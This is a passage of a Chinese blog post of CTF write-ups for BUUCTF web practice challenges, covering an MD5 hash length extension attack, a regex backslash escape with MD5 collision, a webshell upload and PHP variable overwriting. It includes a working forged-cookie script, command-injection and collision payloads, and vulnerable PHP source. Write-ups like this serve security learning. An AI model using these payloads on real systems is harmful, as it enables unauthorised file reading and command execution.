<li>在 /De1ta 中使用 get 传参 param ,在 cookie 里用 action sign 去读取 flag.txt,其中param=flag.txt,action 中要含有 read 和 scan,且 sign=md5(secert_key + param + action)<h3 id="方法一-哈希拓展攻击"><a href="#方法一-哈希拓展攻击" class="headerlink" title="方法一:哈希拓展攻击"></a>方法一:哈希拓展攻击</h3></li>
</ol>
<p><a href="https://joychou.org/web/hash-length-extension-attack.html" target="_blank" rel="noopener">详细资料</a></p>
<p>简单说下md5算法,分为md5 padding和md5 compress</p>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./18.png" title="图片" data-fancybox="images"><img src="./18.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>对输入的一串字符进行md5 padding后,如果这串字符的字节长度对64求余结果不为56,就会填充一个x80和xx个0使得对64求余的结果等于56,此时字符串的字节长度为n*64+56,并且最后8个字节用来记录原始输入信息长度</p>
<p>例如对admin进行md5 padding处理后为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">61646d696e8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000</span><br></pre></td></tr></table></figure>
<p>61646d696e  为admin的hex<br>80  为第一个填充块,后面的一大串0也是填充</p>
<p>2800000000000000  实际值为0000000000000028,十进制的40,单位为bit,为5个字节(admin)</p>
<p>md5算法里有四个向量(Magic number)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x67452301L, 0xefcdab89L, 0x98badcfeL, 0x10325476L</span><br></pre></td></tr></table></figure>
<p>初始化的4个Magic number会和第一个64字节的Message block进行md5 compress压缩算法,压缩算法完成后会产生新的4个Magic number,再进行第二个64字节Message block的md5 compress压缩算法,直到压缩到最后64个字节的(Message block + padding),最后得到的Magic number经过hex转化就是最后的md5 hash值<br>所以当已知 md5(salt+message)的值 message内容 salt+message长度 时,就可以在不知道salt的具体内容情况下计算出任意的md5(salt+message+padding+append)值,逆向出最后一次的4个Magic number<a href="https://github.com/JoyChou93/md5-extension-attack" target="_blank" rel="noopener">大佬的攻击脚本</a></p>
<p>回归正题</p>
<p>geneSign里的request.args.get()方法可以用来请求上下文,即可以用来读取文件内容,先读取一下flag.txt,获得一串md5,是md5(secert_key + ‘flag.txt’ + ‘scan’) 的值,而我们需要的是获取 md5(secert_key + ‘flag.txt’ + ‘readscan’) 的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/geneSign?param=flag.txt</span><br><span class="line">62bc8d3947680a751bfb41f9e69631d9</span><br></pre></td></tr></table></figure>
<p>使用hashpump工具进行哈希长度扩展攻击<br><figure class="image-box">
                <a rel=BUUCTF web练习5 href="./19.png" title="图片" data-fancybox="images"><img src="./19.png" alt="图片" title class></a>
                <p>图片</p>
            </figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">02093a8c2c49c37477f5053717930316</span><br><span class="line">scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read</span><br></pre></td></tr></table></figure>
<p>需要在执行前把转义字符\x变成%然后将这两串传入cookie,脚本如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &apos;http://e695ad48-e686-4361-a809-93147a6a1133.node3.buuoj.cn/De1ta?param=flag.txt&apos;</span><br><span class="line">cookies = &#123;</span><br><span class="line">  &apos;sign&apos;: &apos;02093a8c2c49c37477f5053717930316&apos;,</span><br><span class="line">  &apos;action&apos;: &apos;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read&apos;,</span><br><span class="line">  &#125;</span><br><span class="line">res = requests.get(url=url, cookies=cookies)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure></p>
<p>收到回复信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 hashcookie.py</span><br><span class="line">&#123;&quot;code&quot;: 200, &quot;data&quot;: &quot;flag&#123;40fac20a-bded-4216-889f-ac089966e6d4&#125;\n&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="方法二-字符串拼接"><a href="#方法二-字符串拼接" class="headerlink" title="方法二:字符串拼接"></a>方法二:字符串拼接</h3><p>后两种方法是看大佬博客的,跟着复现学一波</p>
<p>geneSign里的param在方法定义里只有scan的功能,要想实现readscan可以根据python里对md5()方法里参数的拼接,采用字符串拼接的形式,看一下这两块的逻辑</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>
<p>在访问/geneSign?param=flag.txt的时候,返回的数据应该是 md5(‘secert_key’ + ‘flag.txt’ + ‘scan’)<br>在md5()方法里相当于 md5(secert_keyflag.txtscan)</p>
<p>所以当我们传入的数据为 /geneSign?param=flag.txtread 时就拼接出了md5(‘secert_keyflag.txtreadscan’),直接获取到cookie</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/geneSign?param=flag.txtread</span><br><span class="line">cb6a31cfc19b4162449c235bac8251b7</span><br></pre></td></tr></table></figure>
<p>接着抓包访问 /De1ta?param=flag.txt 构造cookie<br>action=readscan;sign=cb6a31cfc19b4162449c235bac8251b7</p>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./20.png" title="图片" data-fancybox="images"><img src="./20.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>flag{40fac20a-bded-4216-889f-ac089966e6d4}</p>
<h3 id="方法三-local-file"><a href="#方法三-local-file" class="headerlink" title="方法三:local_file"></a>方法三:local_file</h3><p>和第二种方法类似,但在文件内容读取上用了local_file函数,与之相关的是CVE-2019-9948,存在不必要的URL方案以允许local_file://读取urllib中的文件</p>
<p>进行读取的话,flag.txt的路径是 local_file:///app/flag.txt,其余步骤与方法二相似</p>
<p>这里是使用的 urllib.urlopen(param) 去包含的文件,所以可以直接加上文件路径 flag.txt 或 ./flag.txt 去访问,也可以使用类似的 file:///app/flag.txt 去访问,但是 file 关键字在黑名单里,可以使用 local_file 代替,​ 如果使用 urllib2.urlopen(param) 去包含文件就必须加上 file ,否则会报 ValueError: unknown url type: /path/to/file 的错误.</p>
<h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">http://0</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">e8b</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">ac</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">5e</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">-</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">a39d</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">-418</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">f-9</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">4</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">6e</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">-52</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">7</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">4</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">96</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">c</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">2ba0b</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">.node3.buuoj.cn</a></p>
<p>查看源码,有一句提示 md5 is funny ~</p>
<p>观察url的变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</span><br><span class="line">对img进行base64解码</span><br><span class="line">MzUzNTM1MmU3MDZlNjc=</span><br><span class="line">再解一次</span><br><span class="line">3535352e706e67</span><br><span class="line">解一次hex</span><br><span class="line">555.png</span><br></pre></td></tr></table></figure>
<p>猜测能进行文件读取,构造index.php查下源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">696e6465782e706870</span><br><span class="line">Njk2ZTY0NjU3ODJlNzA2ODcw</span><br><span class="line">TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</span><br><span class="line">/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=</span><br></pre></td></tr></table></figure></p>
<p>对图片里的base64进行解密<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixi～ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$img对文件进行base64源码读取</span></span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="comment">//对$cmd进行了过滤,但过滤反斜杠 |\\|\\\\| 正则没有写好,可导致反斜杠逃逸</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line"><span class="comment">//md5强类型比较,需要md5碰撞</span></span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>对于本题php反斜杠的正则 |\|\\| 形成的反斜杠逃逸,可以解析一下过程</p>
<ol>
<li>\ 先经过PHP正则解析器为一个\</li>
<li>\ 又跟’|’结合到一起,从而在正则表达式的解析器解析为|</li>
<li>又因为’|’是正则中的保留符号,所以需要一个转义符来转义.所以\|这个的结果就是匹配 ‘|’</li>
<li>后面又跟了\\,这里先经过PHP正则解析器为 \,然后在经过正则表达式的解析器为 ‘\’</li>
<li>最后的正则表达式就是匹配’|\’而不是’|’和’\’,形成反斜杠逃逸</li>
</ol>
<p>根据分析构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=ca\t%20/flag</span><br></pre></td></tr></table></figure>
<p>在md5里有一些md5串编码不同但值相同,就可以用来碰撞绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure></p>
<p>需要抓包改成post传参<br><figure class="image-box">
                <a rel=BUUCTF web练习5 href="./21.png" title="图片" data-fancybox="images"><img src="./21.png" alt="图片" title class></a>
                <p>图片</p>
            </figure></p>
<p>flag{5e4e259d-460a-4ca9-ab42-9641bf7f9179}</p>
<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p><a href="http://434077c3-498f-4c11-a729-f0163dbfb84f.node3.buuoj.cn" target="_blank" rel="noopener">http://434077c3-498f-4c11-a729-f0163dbfb84f.node3.buuoj.cn</a></p>
<p>尝试上传一句话图片马,提示说后缀名不能有ph</p>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./22.png" title="图片" data-fancybox="images"><img src="./22.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>那就上传.htaccess</p>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./23.png" title="图片" data-fancybox="images"><img src="./23.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>再把图片上传</p>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./24.png" title="图片" data-fancybox="images"><img src="./24.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>蚁剑连上</p>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./25.png" title="图片" data-fancybox="images"><img src="./25.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>flag{4d82a478-0cbd-41f0-ab29-ae2d943d8705}</p>
<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p><a href="http://75fc63bc-7ecb-4732-a3f9-26b5dea705f6.node3.buuoj.cn" target="_blank" rel="noopener">http://75fc63bc-7ecb-4732-a3f9-26b5dea705f6.node3.buuoj.cn</a></p>
<p>页面没啥利用点,我的扫描器经常扫不到.git,还是用自己的脚本扫下目录</p>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./26.png" title="图片" data-fancybox="images"><img src="./26.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>一堆弱相应,但存在.git,用githack恢复,看到有flag.php文件,但没恢复出来</p>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./27.png" title="图片" data-fancybox="images"><img src="./27.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>以前做题好像也有这种情况,翻了翻以前的<a href="http://www.damyahome.top/8307%E5%92%8C8302%E9%9D%B6%E5%9C%BAweb%E9%A2%98wp/" target="_blank" rel="noopener">文章</a></p>
<p>尝试用gittool工具里的Dumper和Extractor获得完整源码,失败</p>
<p>奇怪了就是恢复不过来,我换靶机也恢复不过来,只能看着别人博客的源码</p>
<p>flag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = file_get_contents(<span class="string">'/flag'</span>);</span><br><span class="line"><span class="comment">//flag.php只起到一个输出作用</span></span><br></pre></td></tr></table></figure>
<p>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//html略</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//支持get和post传参的数组遍历</span></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//还加了三层过滤规则</span></span><br><span class="line"><span class="comment">//1.不管是get还是post,flag都不能等于flag,否则退出</span></span><br><span class="line"><span class="comment">//2.检测get或post是否有flag,没有则退出</span></span><br><span class="line"><span class="comment">//3.如果get的flag不等于flag,退出</span></span><br><span class="line"><span class="comment">//也就是要求get的flag=flag,但不能post或者get的flag=flag</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure></p>
<p>看一下foreach函数,在不改变flag的情况下exit()也能作为输出,本题的思路就是变量覆盖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">foreach</span><br><span class="line">(PHP 4, PHP 5, PHP 7)</span><br><span class="line">foreach 语法结构提供了遍历数组的简单方式。foreach 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：</span><br><span class="line">foreach (array_expression as $value)</span><br><span class="line">    statement</span><br><span class="line">foreach (array_expression as $key =&gt; $value)</span><br><span class="line">    statement</span><br><span class="line">第一种格式遍历给定的 array_expression 数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。</span><br><span class="line">第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 $key。</span><br></pre></td></tr></table></figure></p>
<h3 id="方法一-GET"><a href="#方法一-GET" class="headerlink" title="方法一:GET"></a>方法一:GET</h3><p>get里只要能构成变量覆盖,用$yds或$is都行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果是yds=flag<br>$x=yds,$y=flag,所以$$x=$yds,$$y=$flag</p>
<p>$$x = $$y,也就是$yds=$flag</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yds=flag</span><br></pre></td></tr></table></figure>
<p>如果是is=flag<br>$x=is,$y=flag,所以$$x=$is,$$y=$flag</p>
<p>$$x = $$y,也就是$is=$flag</p>
<p>又因为要求flag=flag,所以$x=flag,$y=flag,带进去变成$flag=$flag</p>
<p>将两种情况连接起来</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is=flag&amp;flag=flag</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=BUUCTF web练习5 href="./28.png" title="图片" data-fancybox="images"><img src="./28.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>flag{64be7429-88b0-4318-8e17-3a7efb7a540a}</p>
<h3 id="方法二-GET-POST"><a href="#方法二-GET-POST" class="headerlink" title="方法二:GET+POST"></a>方法二:GET+POST</h3><p>在post里也可以进行一次变量覆盖</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach($_POST as $x =&gt; $y)&#123;</span><br><span class="line">$$x = $y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要post一个等式使得执行后为$$flag=$flag,即$flag=flag<br>然后get传参为yds=flag,详细看方法一</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">yds=flag</span><br><span class="line">POST:</span><br><span class="line">$flag=flag</span><br></pre></td></tr></table></figure>

        </div>
        
<blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    最后更新时间：<time datetime="2020-10-07T13:20:27.489Z" itemprop="dateUpdated">2020-10-07 21:20:27</time>
</span><br>


        
        转载注明出处，原文地址：<a href="/ctf-writeup-web/ckwd5kugt001y5cuc4fogu9df/" target="_blank" rel="external">http://www.damyahome.github.io/ctf-writeup-web/ckwd5kugt001y5cuc4fogu9df/</a>
        
    </div>
    <footer>
        <a href="http://www.damyahome.github.io">
            <img src="/img/avatar.jpg" alt="Damya">
            Damya
        </a>
    </footer>
</blockquote>

        
            <div class="page-reward">
    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
</div>

            
        
        <div class="post-footer">
            
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/个人ctf竞赛/">个人ctf竞赛</a></li></ul>

            <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.damyahome.github.io/ctf-writeup-web/ckwd5kugt001y5cuc4fogu9df/&title=《BUUCTF web练习5》 — Damya's Blog&pic=http://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.damyahome.github.io/ctf-writeup-web/ckwd5kugt001y5cuc4fogu9df/&title=《BUUCTF web练习5》 — Damya's Blog&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

        </div>
        
            


        
    </div>
    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="prev">
      <a href="/AWD/ckwd5kuf800075cuct8brazsm/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">10.8 队内AWD小结</h4>
      </a>
    </div>
  

  
    <div class="next">
      <a href="/ctf-writeup-web/ckwd5kugp001r5cucudzqw5d0/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">BUUCTF web练习4</h4>
      </a>
    </div>
  
</nav>


    
    
        <aside class="post-widget">
            <nav class="post-toc-wrap" id="post-toc">
                <strong>目录</strong>
